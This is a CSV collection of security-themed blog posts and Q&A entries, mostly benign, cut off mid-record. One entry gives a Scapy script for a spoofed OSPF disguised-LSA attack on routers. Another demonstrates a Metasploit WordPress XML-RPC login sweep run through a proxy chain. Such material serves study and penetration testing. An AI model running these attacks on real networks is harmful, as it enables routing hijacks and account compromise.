A,C
"This is the last segment in the series. To begin with, I have a question for you… What do you call a device that has a 1 gigahertz microprocessor, 512 megabytes of RAM, several gigabytes of solid state storage, runs programs, can be programmed, and can access the internet? Sound a bit like a Netbook,

This is the last segment in the series. To begin with, I have a question for you…

What do you call a device that has a 1 gigahertz microprocessor, 512 megabytes of RAM, several gigabytes of solid state storage, runs programs, can be programmed, and can access the internet? Sound a bit like a Netbook, but computer is the answer I am looking for. Now add the ability to make phone calls on a CDMA or GSM network and you have a smart phone. The point is that your smart phone is a computer and many smart phones have the ability to run Adobe Flash. Flash is supported on Android version 2.2, Windows Mobile, and even on the iPhone 4. This means that it isn’t only your PC you need to be concerned with, but the spy is in your phone as well. The configuration options for mobile Flash are a lot more simplistic, but you need to go to https://settings.adobe.com/flashplayer/mobile/ on your mobile device. This is what it looks like on a Droid 2.

As you can see, there are no global settings. Taking a look at Local Storage and at Peer Assisted Networking we see that the default is for least privacy and peer-assisted networking is enabled.





Obviously selecting never for local storage provides the most privacy, but also the least functionality. Selecting “Only from sites I visit” is probably the most reasonable choice presented. Whether or not you enable the cache is really up to you. These telephony equipped computers have a lot less space than a standard PC, but caching components may decrease data usage if you do not have an unlimited plan. I simply disable peer-assisted networking. I’m really not interested in having someone else use my bandwidth.

Unlike the highly granular configuration options that are possible with the mms.cfg file on a PC, Flash on the mobile platform offers very little choice in protecting your privacy. If you have Flash on your mobile device, I recommend you visit the settings manager periodically to make sure your choices have not been altered in an update. If you are traveling in an area where roaming charges might apply, before you leave, you might want to disable local storage entirely for Flash, but that is for cost savings, not privacy.

To sum up the series, Adobe Flash does enable a lot of quality video content on the web, however the price it comes with is privacy. Adobe isn’t going to tell you how, who, or when Flash is being used to track you, so it is up to you to take control. Perhaps you are fine with being tracked, some people are, but you can’t make the decision if you don’t know there is a decision. I hope this series has helped you understand some of the risks associated with Flash, and some of your options for controlling your privacy.

Randy Abrams

Director of Technical Education

ESET LLC",1
"<p>First of all, you need to talk to a QSA on something like this.</p>

<p>That said, I believe the <a href=""https://www.pcisecuritystandards.org/documents/PCI_Card_Production_Logical_Security_Requirements_2013.pdf"" rel=""nofollow"">PCI Card Production Logical Security Requirements</a> document most closely applies to your issue.  And the sticker is that the <strong>cardholder does need to provide ""some sort of secret key.""</strong>  Specifically, section 10 <strong>PIN Distribution via Electronic Methods</strong> says you need to validate that the request is coming from the cardholder:</p>

<blockquote>
  <p>e) Communication of the PIN to the cardholder must only take place after
  verification of the identification value and associated authentication
  value. </p>
  
  <p>f) The identification and authentication values must not
  disclose the account number.</p>
  
  <p>g) The authentication mechanism or value  must be different than the identification value and must not be a value easily associated with the cardholder. </p>
  
  <p>h) The authentication
  value must be communicated to the cardholder in such a way that access
  by anyone other than the cardholder is detected.</p>
</blockquote>

<p>h) also implies that the cardholder can't pass their authentication value through the third party, but you knew that.</p>

<p>You're correct that REST or web services would not be appropriate, but <strong>an iframe is probably acceptable</strong>, because an iframe means that the communication regarding the PIN would be directly between the cardholder's browser and your server, bypassing the third party.  The third party simply provides the link that allows the cardholder to go directly to you.  iframe is probably the appropriate technology to meet your requirement of having it appear to come through the third party and the PCI requirement of requiring the transaction be directly between you from the cardholder.</p>

<p>Alternately, you could simply do a branded page.  You create a web page with the look and feel of your third parties' web site, and they link to your page.  Cardholders go to your site, your URL, but it looks enough like the third party to seem the same.</p>

<p>So, to sum up - the third party passes the cardholder to you, via iframe or direct link.  The cardholder submits authentication data to you and gets the PIN back, and ends up either continuing (iframe) or being redirected back to (direct link) the third party's site.  </p>

<p>You may not be able achieve one of your goals: to do this ""<em>transparently, so the customer doesn't have to enter a password or provide an encryption key.</em>""  That's not compatible with PCI requirements.  (That said, if your QSA approved, and the third party was able to sufficiently authenticate the cardholder through their normal process, and pass cryptographically strong proof of that along as a cookie or request parameter, then maybe you could make it transparent.  But that's where you really, really, really need a QSA's advice, because maybe that violates 'h' above)</p>
",1
"<p>As an IT auditor, let me give you an answer from experience. </p>

<p><strong>Segregation of duties - SOD</strong></p>

<p>It is a good practice and core principle to segregate employees who operate or administer the system from which audit logs are produced from employees such as myself, with responsibilities to review these logs for fraud / malicious activity / security vulnerabilities. If these duties are not segregated, then a single individual can undermine the system by making a malicious change, and cover his wrongdoing by modifying the audit logs to hide his actions. To illustrate, the following individuals <strong>in general</strong> should <strong>not</strong> have access to log data. </p>

<ol>
<li>Security administrators</li>
<li>Computer operations personnel</li>
<li>Data base administrators</li>
</ol>

<p>To expand on the above examples, if a security administrator has access to logs data, he can escalate his own privileges to allow for improper access greater than is appropriate for his job duties, a violation of the security principle of <strong>Least Privilege</strong>. To prevent or deter detection, he can delete and / or falsify values for log entries of date, user ID...etc. The same reasoning applies to items 2 and 3.</p>

<p>To prevent the aforementioned, logs can be centrally stored in a server in which access is strictly controlled to individuals with specific roles - RBAC. <strong>Periodic review of individuals having access to logs should be conducted and improper access rights should be removed immediately upon discovery.</strong></p>

<p><strong>Secure storage of logs</strong></p>

<p>Log data should be <strong>backed up on a regular basis and the backup should be stored offsite</strong> away from main company operations. This is to ensure that if a disaster (ex: Fire or flood) were to occur at the main company site, data loss will be mitigated.If logs contain sensitive information, log backups should be <strong>encrypted using strong cryptography such as AES 256.</strong> A written method, such as receipts should be used to track shipping and receipt of these logs. Periodically, a reconciliation of backup media should be taken against the tracking documentation, with <strong>any failed reconciliations promptly investigated.</strong></p>

<p>Monitoring procedures regarding security and confidentiality of backup storage should be documented. If these responsibilities are delegated to a third party to perform, SLAs and a contract should ideally be in place, explicitly specifying the duties of each party (Company and vendor), and ideally include a <strong>right to audit clause</strong> in the contract. Log retention length of time should be documented in a retention policy known to all individuals with a job role of handling backups.</p>

<p>Finally, to learn more, <a href=""http://www.isaca.org/Journal/archives/2012/Volume-6/Pages/What-Every-IT-Auditor-Should-Know-About-Proper-Segregation-of-Incompatible-IT-Activities.aspx"" rel=""nofollow"">this is an authoritative source</a> from ISACA.</p>
",1
"<p>I have a site that highlighted as having a malware. I found 88 files that were infected with ""php_include_obf_local"" which I deleated them all. But there is still a ""folder"" each time I delete it keeps auto creating itself ... how can I find where the malware is injecteing it from ? Its also a WordPress site ...</p>

<p>I have chaked all teh root files and found no injection code, I have already deleated 88 files with infection. And I have aldo downloaded a database dump and checked to see any reference to teh malware signiture nothing found!</p>

<p>below is a sample code thats getting loaded to the ""index.php"" file ...</p>

<pre><code>[[&lt;script type='text/javascript' language='javascript' &gt;   window._wpemojiSettings = { ""baseUrl"":""https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/"",""ext"":"".png"",""svgUrl"":""https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/"",""svgExt"":"".svg"",""source"": { ""concatemoji"":""http:\/\/tie.com.sa\/site\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"" }  };  !function(a,b,c) { function d(a,b) { var c=String.fromCharCode; l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0); var d=k.toDataURL(); l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0); var e=k.toDataURL(); return d===e } function e(a) { var b; if(!l||!l.fillText)return!1; switch(l.textBaseline=""top"",l.font=""600 32px Arial"",a) { case""flag"":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))%26%26(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b); case""emoji"":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b } return!1 } function f(a) { var c=b.createElement(""script""); c.src=a,c.defer=c.type=""text/javascript"",b.getElementsByTagName(""head"")[0].appendChild(c) } var g,h,i,j,k=b.createElement(""canvas""),l=k.getContext%26%26k.getContext(""2d""); for(j=Array(""flag"",""emoji""),c.supports= { everything:!0,everythingExceptFlag:!0 } ,i=0; i&lt;j.length; i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything%26%26c.supports[j[i]],""flag""!==j[i]%26%26(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag%26%26c.supports[j[i]]); c.supports.everythingExceptFlag=c.supports.everythingExceptFlag%26%26!c.supports.flag,c.DOMReady=!1,c.readyCallback=function() { c.DOMReady=!0 } ,c.supports.everything||(h=function() { c.readyCallback() } ,b.addEventListener?(b.addEventListener(""DOMContentLoaded"",h,!1),a.addEventListener(""load"",h,!1)):(a.attachEvent(""onload"",h),b.attachEvent(""onreadystatechange"",function() { ""complete""===b.readyState%26%26c.readyCallback() } )),g=c.source|| {  } ,g.concatemoji?f(g.concatemoji):g.wpemoji%26%26g.twemoji%26%26(f(g.twemoji),f(g.wpemoji))) } (window,document,window._wpemojiSettings);     &lt;/script&gt;]]
</code></pre>

<p>Any idea on how to find and fix this issue ?</p>
",1
"<p>I am implementing SSL client authentication for our iPhone app and am using the app keychain to store the client identity (certificate + private key).  After adding the items to the keychain, I am getting some unexpected results when using SecItemCopyMatching.  Quick summary:  I add exactly one SecIdentityRef to the keychain, but SecItemCopyMatching finds two afterwards.  Let me start with the facts.</p>

<p>I am running my app on an iPod with iOS 4.3.5.</p>

<p>I have an empty app keychain to start with.</p>

<p>My certificates are all created using openssl and deployed to the iPod via a PKCS#12 file as an email attachment.
The PKCS#12 file contains:</p>

<ul>
<li>Client certificate</li>
<li>Client CA certificate (issuer of the Client certificate)</li>
<li>Root CA certificate (issuer of the Client CA certificate)</li>
<li>RSA private key of the client certificate</li>
</ul>

<p>SecPKCS12Import successfully imports the file and the resulting dictionary has the following content:</p>

<ul>
<li>one ""identity""</li>
<li>one ""trust""</li>
<li>one ""chain"" (CFArray which holds the three certificates mentioned above)</li>
</ul>

<p>Using SecItemAdd, I successfully add the ""identity"" to the keychain.</p>

<p>Next, I retrieve the ""chain"" array from the dictionary and attempt to add the certificates.  In doing so, the first one fails with error errSecDuplicateItem.  I assume this is because the first certificate is the client certificate and that it was already added to the keychain when I added the identity.  The other two certificates are added without error.</p>

<p>Now, if I go back and use SecItemCopyMatching with these key/value pairs...</p>

<pre><code> keys   = {kSecClass, kSecReturnRef, kSecMatchLimit}
 values = {kSecClassIdentity, kCFBooleanTrue, kSecMatchLimitAll}
</code></pre>

<p>...two identities are returned!  Furthermore, if I retrieve the certificate for each (SecIdentityCopyCertificate) and then the summary (SecCertificateCopySubjectSummary), I see the both identities have the same certificate!</p>

<p>Lastly, when I try to clear the identities from the keychain (SecItemDelete), the first attempt is successful but the second fails with errSecItemNotFound.</p>

<p>It is clear from all the googling I have been doing that there are ""issues"" with the iOS keychain.  However, I have not seen this reported; nor have I seen anything even remotely related.  </p>

<p>So, my questions:</p>

<ul>
<li>Am I using SecItemCopyMatching correctly?</li>
<li>When using SecItemCopyMatching to find identities in the keychain, how does it determine the identities that are present?  Is this dynamic, or strictly based on how many SecIdentityRef items were added?</li>
<li>could this problem possibly be related to the certificates themselves?  Note that despite this issue, I am still able to retrieve the first identity and certificates in order to respond to didReceiveAuthenticationChallenge.</li>
</ul>

<p>I can post code and/or certificate dump, if needed.</p>

<p>Thanks in advance,</p>

<p>Ken Cross
Siemens Enterprise Networks.</p>
",1
"<p>I want to do disguised LSA attacks on OSPF network and be able to more analyze, so I do not know how it works in practice. This is a penetration test.</p>

<p>The attack is described in the address<a href=""http://www.internetsociety.org/sites/default/files/P01_3.pdf"" rel=""nofollow noreferrer""> [+]</a>. I have run the network are as follows:</p>

<p><img src=""https://i.stack.imgur.com/IyJiG.png"" alt=""enter image description here""></p>

<p>Source program in accordance with the above photo are as follows:</p>

<pre><code>#!/usr/bin/env python


from scapy.all import *
load_contrib(""ospf"")
#from ospf import *
from time import sleep,clock,time

def ourSend(packet):
    sendp(packet,iface='eth0')     # is 192.168.184.131
#    sleep(2)

def ourSend2(packet):
    sendp(packet,iface='eth1') # is 192.168.57.20
#    sleep(2)


victim='172.16.1.1'          #This is the IP address of interface through which the victim will receive the trigger LSA. 
victimId='1.1.1.1'           #This the router ID of the victim router.
victimNeighbor='172.16.1.2'  #This is the IP address of a neighbor of the victim router to which the disguised LSA is sent
spoofSRC='192.168.184.131'           #This is an IP address of one of the neighbors of the victim. It is used as a spoofed IP 

host1='192.168.1.0'      #This will used in the bogus Link entries in the disguised LSA.
host2='192.168.2.0'      #This will used in the bogus Link entries in the disguised LSA.
sequence=7               #The sequence number of the disguised LSA

#The bogus Link entries to be included in the disguised LSA. The contents of the last link (collisionLink) is chosen 
# so that the LSA will have a specific checksum desirable to our network example (0x2028 in this example). The contents of this link has been
# calculated offline.  
link2host1 = OSPF_Link(id=host1,data='255.255.255.255',type=3)
link2host2 = OSPF_Link(id=host2,data='255.255.255.255',type=3)
link2victim = OSPF_Link(id=victimId,data=victim,type=2)
collisionLink = OSPF_Link(id='0.0.0.0',data='0.0.0.0',type=0,toscount=27,metric=156)

# Build the trigger LSA. Note that it is sent with sequence number that is smaller by one from the sequence of the disguised packet.
IPlayer=IP(src=spoofSRC,dst=victim)
OSPFHdr=OSPF_Hdr(src=spoofSRC)
trigger=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence-1,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2])])

#Buid the disguised LSA
IPlayer=IP(src=victim,dst=victimNeighbor)
OSPFHdr=OSPF_Hdr(src=victimId)
disguisedLsa=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2,collisionLink])])
#Send them both 
ourSend(trigger)
ourSend2(disguisedLsa)
</code></pre>

<p>But I do not know why did not affect!! Packet send but not affect.</p>

<p>IOS version : 12</p>

<p>VMnet1,VMnet8 interface is : HostOnly type.</p>
",1
"<p>You are searching for the <code>VHOST</code> option. As you may know, when you rent some web hosting services, you may choose between a dedicated server and a shared one (which is much more cheaper)</p>

<ul>
<li><p>On shared servers, you are sharing the same machine with random peoples. It means the websites hosted on a shared server will share the same IP address. That's why you need to write the virtual host option, it will specify which domain name you want to query on this IP address.</p></li>
<li><p>On dedicated servers, you can configure the machine the way you want. With or without virtual hosts. </p></li>
</ul>

<p>You can determine virtual host presence with the host command on your Linux distribution:</p>

<pre><code>┌──[13:33:43]─[root@attack3r]
└──&gt; ~ $ &gt;&gt; host target-website.com
   target-website.com has address 49.49.49.49
┌─[13:34:21]─[root@attack3r]
└──&gt; ~ $ &gt;&gt; host 49.49.49.49
   49.49.49.49.in-addr.arpa domain name pointer www.host-service-provider.com
</code></pre>

<p>In the example above, by resolving both the IP and target-website.com you can determine: </p>

<ul>
<li><p>The target website point to 49.49.49.49</p></li>
<li><p>49.49.49.49 point to the host service provider domain name</p></li>
</ul>

<p>In this example, target-website.com is a virtual host on 49.49.49.49. Otherwise, the IP lookup should return target-website.com, not the service provider domain name. </p>

<p>Keep in mind that there are some exceptions, for example, try to do the same operation with security.stackexchange.com</p>

<hr>

<h3>Testing without VHOST</h3>

<ul>
<li><code>use auxiliary/scanner/http/wordpress_xmlrpc_login</code></li>
<li><code>set RHOSTS 49.49.49.49</code></li>
<li><code>set TARGETURI /wp/</code></li>
<li><code>set USERNAME root</code></li>
<li><code>set PASSWORD toor</code></li>
<li><code>run</code></li>
</ul>

<p>Output</p>

<pre><code>[*] 49.49.49.49:80    :/wp/xmlrpc.php - Sending Hello...
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
[-] XMLRPC is not enabled! Aborting
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<h3>Adding VHOST</h3>

<ul>
<li><code>set VHOST target-website.com</code></li>
<li><code>run</code></li>
</ul>

<p>output</p>

<pre><code>[*] 49.49.49.49:80    :/wp/xmlrpc.php - Sending Hello...
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
[+] 49.49.49.49:80   - XMLRPC enabled, Hello message received!
[*] Starting XML-RPC login sweep...
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
[-] 49.49.49.49:80   - Failed: 'root:toor'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<h3>edit : Answering comments</h3>

<p>yes it does:</p>

<p><a href=""https://i.stack.imgur.com/wtxVl.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wtxVl.jpg"" alt=""vhost""></a></p>
",1
"Hello every body, obligatory pass post here. Hopefully it helps others going through it like your posts did for me. I went in and made it to 100 questions before my exam ended. I was nervous to the point my eye started to twitch. Didn't think I'd even make it to 100 questions before the exam would end and send me home empty handed. 

One thing to note about that is that you shouldn't get discouraged by people on this sub saying the questions are ""COMPLETELY DIFFERENT, SUPER UNRELATED TO ANY OF THE THOUSAND BOOKS AND PRACTICE TESTS OUT THERE THAT YOULL EVER FIND"". I found this to just not be true. Yeah, the questions aren't going to be word for word like you have in the sybex book or boson but they were the same difficulty in my opinion especially like the practice tests in the supplementary sybex workbook with the thousand questions or so. 

I used the following:

-Sybex Official study guide seventh edition

-Complementary book of Sybex Official practice tests (I got the bundle) in my opinion these were the closest in difficulty and ""language"" if you will, to the real deal

-Boson practice exam, I know they're ""outdated""..... But they're not really. The exam doesn't change at all for this year. Only the weight of each domain. Also the format. So these are 1000% relevant, and helped me to understand ALOT more of the meat and bones of the material. It helps to go back and redo the questions you got incorrect so you can really absorb it.

I got both sybex official apps. If I knew that the questions were gonna be exactly the same as in the 2 books I would have never bought the books. Not because the books were useless per se, but I'm definitely not the type of person to read that monster cover to cover and expect to retain ANY valuable information.

A bit of my background, I did help desk / sysadmin for about 3 years before I got an ""official"" systems analyst role for a fourth year all of which were in hospitality. It was basically a bit of everything, from incident response, to help desk, to server stuff, networking, management, etc etc I know it doesn't seem like alot but I learned ALOT of everything IT related those years. I currently work in information security for a financial services company for about 1 year and 4 months now. I am fortunate enough to have to deal alot with what is covered in this exam, like the policies, standards, risk management, sdlc, PCI, Sox, business models, etc.

 I am the type of person to never stop learning because I absolutely love it and want to utilize that to push myself to further my career. 

I currently hold a+, n+, sec+, SSCP, eJPT from elearnsecurity, and a ton of learning from previously studying for OSCP which I took a break from to knock this monster out.

Overall I studied about 3 months, February I basically skimmed the stuff over deciding to hit it hard in March and this month.

TLDR; don't listen to the negative shit on this board and if you don't sit for the exam because you're busy shitting yourself like I was, FUCK it, take the exam

Edit: grandma. I mean grammar.
",1
"<p>Let's get something straight first. In the general sense, there's pretty much no such thing as tamper-resistant in the envelop/packaging world. What you're looking for is tamper-<strong>evident</strong>.</p>

<p>The criteria upon which you evaluate tamper-evident envelope is same used for evaluating any other security measurement. Forget everything about solution itself and rather think of <em>why</em> you're looking for a solution. It's easy to say that your problem is tampering, but it's not.</p>

<p>So the criteria hugely depends on <em>your</em> threat model.
 Other than that, there's basically one criterion; If the envelope is tampered with, we'd like to detect that with a high level of confidence.</p>

<hr>

<p>In 1997, The Nuclear Regulatory Commission issued the <a href=""http://www.orau.org/ptp/PTP%20Library/library/NRC/Reguide/05-015.PDF"" rel=""nofollow"">RG 5.15</a> in which they outlined criteria upon which to judge the effectiveness of tamper-evident mediums used to store nuclear documents. I'll quote some of them</p>

<blockquote>
  <ul>
  <li><p>The information taken and recorded at the time of seal application is inadequately protected, enabling a diverter to forge documentation
  to support or cover the diversion.</p></li>
  <li><p>The method of postmortem examination of the seal is not sufficient to detect a defective or compromised seal.</p></li>
  <li><p>The location and method of seal application makes the seals vulnerable
  to accidental damage, providing a history of such incidents that might
  be used to conceal a willful attack.</p></li>
  </ul>
</blockquote>

<p>After that they list some certain acceptable types of tamper-deviant devices to store the highly sensitive data.</p>

<p>In the same year, researcher R.G. Johnston <a href=""http://library.lanl.gov/cgi-bin/getfile?00418792.pdf"" rel=""nofollow"">published a paper</a> outlining some deficiencies in the RG 5.15 and the then-standard <a href=""http://www.astm.org/Standards/F1158.htm"" rel=""nofollow"">ASTM F1158-88</a> protocol. Johnston did a great job providing crystal clear instructions for the process, combining the pros of the previous standards and patching most of their cons.</p>

<blockquote>
  <p>A detailed description of the successful attacks. For each attack the
  following information should be provided:</p>
  
  <ul>
  <li><p>Is the attack theoretical, partially demonstrated, fully demonstrated but not perfected, or practiced to perfection?</p></li>
  <li><p>What are the cost, time, and effort to devise and demonstrate the attack?</p></li>
  <li><p>What time is required on-site to do the attack?</p></li>
  </ul>
  
  <p>..</p>
  
  <ul>
  <li><p>What is the level of defeat?</p></li>
  <li><p>Is inside information necessary for the attack, or just what is publicly available?</p></li>
  </ul>
</blockquote>

<p>Despite <a href=""http://www.ne.anl.gov/capabilities/vat/seals/references.html"" rel=""nofollow"">Johnston's findings and recommendations</a>, the ASTM F1158 still the de facto standard protocol for assessing security seals.</p>
",1
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""https://stackoverflow.com/questions/3087548/can-spring-security-use-preauthorize-on-spring-controllers-methods"">Can Spring Security use @PreAuthorize on Spring controllers methods?</a>  </p>
</blockquote>



<p>Here is my configuration:
pom.xml</p>

<pre><code>&lt;!-- Spring Security --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-config&lt;/artifactId&gt;
    &lt;version&gt;${spring-security.version}&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-taglibs&lt;/artifactId&gt;
    &lt;version&gt;${spring-security.version}&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-web&lt;/artifactId&gt;
    &lt;version&gt;${spring-security.version}&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;

&lt;!-- AOP dependency --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;cglib&lt;/groupId&gt;
    &lt;artifactId&gt;cglib&lt;/artifactId&gt;
    &lt;version&gt;2.2&lt;/version&gt;
&lt;/dependency&gt;
&lt;!-- end of Spring Security --&gt;
</code></pre>

<p>here is security.xml -> </p>

<pre><code>    &lt;!-- secured-annotations = (@Secured(""ROLE_ADMIN"")) --&gt;
    &lt;!-- jsr250-annotations = (@RunAs @RolesAllowed @PermitAll @DenyAll @DeclareRoles) --&gt;
    &lt;!-- pre-post-annotations = @PreAuthorized(""hasAuthority('ROLE_ADMIN')"") --&gt;

&lt;global-method-security secured-annotations=""disabled""
                        jsr250-annotations=""disabled""
                        pre-post-annotations=""enabled""/&gt;

&lt;http       auto-config='true' 
            disable-url-rewriting=""true"" 
            access-denied-page=""/WEB-INF/jsp/errors/accessDenied.jsp""&gt;


    &lt;anonymous granted-authority=""ROLE_ANONYMOUS"" key=""anonymous""/&gt;


    &lt;logout logout-url=""/logout.do"" logout-success-url=""/"" /&gt;

    &lt;form-login always-use-default-target=""false"" 
        authentication-failure-url=""/?authfailed=true"" 
        default-target-url=""/person""
        login-page=""/"" 
        login-processing-url=""/login""
        username-parameter=""username"" 
        password-parameter=""password"" 
         /&gt;

      &lt;remember-me key=""rememberMe"" services-ref=""rememberMeService""/&gt;
&lt;/http&gt;
</code></pre>

<p>When I try run any controller like -> </p>

<p>@RequestMapping(""/person"")
public class PersonController {</p>

<pre><code>@RequestMapping("""")
    @PreAuthorize(""hasAuthority('ROLE_ADMIN')"")
public String root() {
    doStuff();
    return ""redirect:/person/home"";
}
</code></pre>

<p>with any different role, I got right result.  so @PreAuthorize(""hasAuthority('ROLE_ADMIN')"") annotation is not working. </p>

<p>No compilation mistakes, no runtime exceptions.</p>

<p>Thanks.</p>
",1
"A post promising a video of a plane landing on water has been circulating on Facebook, with a title suggesting that it contains news footage of the rescue of passengers on board the missing flight MH370 – but there is no video, and it’s a criminal scam.

A post promising a video of a plane landing on water has been circulating on Facebook, with a title suggesting that it contains news footage showing the rescue of passengers on board the missing Malaysia Airlines flight MH370 – but the video is a ‘callous’ cyber scam, according to Hoax-Slayer, and in fact shows a plane landing on water in Bali in 2013.

IT Pro Portal reports that one variant of the scam is a ‘video’ titled, “Malaysia Plane MH370 Has Been Spotted Somewhere Near Bermuda Triangle. Shocking Videos Release Today”, and that the video is being used to spread malware. Other reports say that variants of the scam are used to direct users to spread the video via Facebook, and complete bogus surveys, used by cybercriminals to harvest personal details from their victims.

IT Pro Portal points out that the Bermuda Triangle is 10,000 miles from the last point of contact with the flight.

The Epoch Times reports that the images show a plane crash near Bali in Indonesia in 2013, where 100 passengers were rescued after a plane landed on water. In all reported variants of the scam, there is no video to click through to – just surveys designed to steal personal information, or bogus downloads which are in fact malware.

Hoax-Slayer describe the scam as a ‘callous’ variant on a common cybercriminal trick of using posts which promise ‘sensational’ viral videos to harvest personal information or spread malware.

“The image used in the scam post shows a Lion Air passenger plane that crashed into the sea, when landing on Bali in April 2013. While there were some injuries in the crash, there were no fatalities. The picture has no connection whatsoever with flight MH370,” the site reports. “Once they have shared [on Facebook] as requested, users will then be taken to another fake page that supposedly hosts the video. However, a popup ‘Security Check’ window will appear that claims that they must prove that they are human by clicking a link and participating in an online survey or offer. But, no matter how many surveys or offers they complete, they will never get to see the promised video.”

Scammers often target Facebook with copies of viral content – or entirely fake, sensational videos, such as ‘Giant Snake Swallows Zookeeper’, as reported by We Live Security this year.

ESET researcher Stephen Cobb offers a We Live Security Guide to spotting Facebook scams, “Can we trust our friends not to make questionable decisions on social media? Apparently not, because our friends might actually be scammers in disguise, or just not well-informed.”

In many cases, scam videos will install a ‘rogue’ Facebook app to spread rapidly via the network – but as reported by We Live Security here, such scams can, in the worst case scenario, lead to tainted sites which infect users with malware.",1
"<p><em>Would this attract hackers?</em> Yes, of course, that's the point of it. Good hackers, bad hackers, grey / white / black / multicolor hat hackers. They will come and inspect your server's front-door.</p>

<p><em>Should you be afraid of it?</em> Normally, your security posture should not rely on the absence of any attacker, otherwise you indeed have a big problem to solve. When you put such policy in place, it means that:</p>

<ul>
<li>You are sufficiently confident in your server security, you have setup the proper mitigation and monitoring systems,</li>
<li>You have people in measure to directly handle potential security incidents,</li>
<li>You have the right to take such initiative (you are not renting your server to an external service provider who could take the initiative of suing the discloser),</li>
<li>You have established the proper communication around this (a lot of companies rightfully fear about loosing competitiveness when uninformed customers and partners may have to choose between a company publishing information regarding its security issues and a company showing no security issues).</li>
</ul>

<p>As I understand it, while you engage yourself to not sue people testing your security in the perimeter defined by your policy, you do not have any commitment to open all the doors to make their investigations easier (as it may be done upon contractual assessment to speed up the process and ensure a deeper coverage of the targeted application, for instance by disabling a web application firewall to focus the tests on the application itself).</p>

<p>All you defenses remain nearly the same, all threshold are still active. If a tester is blocked for a few minutes, if he gets Captcha to solve, etc.: all this is to be expected and is part of the game.</p>

<p>The only difference is that, instead of working only from time to time, your first-level defense mechanisms will be triggered on a far more regular basis, with certainly some people trying to maliciously abuse them, but also benevolent hackers analyzing them and ready to contact you in case of any flaw has been found.</p>

<p>So to summarize:</p>

<ul>
<li>Without any responsible disclosure policy:

<ul>
<li>Malicious bots and attackers try from time to time to hack your server,</li>
<li>Your defense systems are triggered occasionally.</li>
</ul></li>
<li>With a responsible disclosure policy:

<ul>
<li>There might be an higher amount of malicious attackers trying to hack the server, but this is not even sure since it is usually the sign of a sane security posture (the fact that you advertise that there actually <em>is</em> a security team may put your server out of the low hanging fruits),</li>
<li>Your first-level defense systems will be triggered on a regular basis,</li>
<li>In case of failure of these defenses, there is a high probability that you will be contacted by a benevolent hacker informing you about the issue.</li>
</ul></li>
</ul>

<p>So, all-in-all, I have the impression that the latter gives a better security feeling that the former.</p>
",1
"<p>I have a spring mvc application with angular js on the Ui.</p>

<p>I have the following requirement where in</p>

<p>I get details from user (Consider a product ,amount)</p>

<p>I need to send the details to a payment gateway as post request  along with the redirection to the payment gateway website </p>

<p>Right now we send the details to the UI built on angular js and the Ui sends a  post request to the payment gateway and we enter the payment gateway website</p>

<p>As we have lot of sensitive data sent to the UI we wanted to implement the redirection to payment gateway along with the post request on the server side so as to be secure.</p>

<p>I have not been able to do this using controllers in spring mvc </p>

<p>I have tried the following methods</p>

<p>1] forward://website name (As this does not work for url outside the application)</p>

<pre><code>@RequestMapping(value=""/serverRedirection"",method = RequestMethod.GET)
    public String myMethod(HttpServletRequest request) {

        RechargeDto rechargeDto = new RechargeDto();
        rechargeDto.setAmount(""500"");
        rechargeDto.setProvider(""AT"");
        rechargeDto.setMobile(""9892948061"");
        logger.info(""Entered recharge controller"");
        String message = ""Invalid from app"";

        request.getSession().setAttribute(""amount"", rechargeDto.getAmount());
        request.getSession().setAttribute(""mobile"", rechargeDto.getMobile());
        request.getSession().setAttribute(""provider"", rechargeDto.getProvider());

        PauDto pauDto = rechargeService.passToPayu(Float.parseFloat(rechargeDto.getAmount()), 2l, ""9898989898"");
        request.setAttribute(""key"", pauDto.getKey());
        request.setAttribute(""txnid"", pauDto.getTxnid());
        request.setAttribute(""service_provider"", pauDto.getService_provider());
